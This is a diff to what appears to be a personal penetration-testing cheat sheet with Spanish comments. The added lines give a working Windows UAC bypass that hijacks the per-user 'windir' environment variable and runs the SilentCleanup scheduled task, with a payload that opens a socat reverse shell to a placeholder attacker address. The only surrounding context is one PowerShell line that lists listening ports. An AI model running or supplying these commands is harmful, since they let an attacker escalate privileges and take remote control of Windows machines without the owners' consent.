@@ -1,3 +1,14 @@
+## Bypassing Always Notify - schedule task
+# tarea programada
+%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive
+
+# modifica el contenido de la variable de entorno %windir%
+reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
+# lo que esta detras de REM queda como comentario
+
+# inicia la tarea programada
+schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+-----
 # PS netscan
 Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property LocalAddress,LocalPort,ProcessName
 
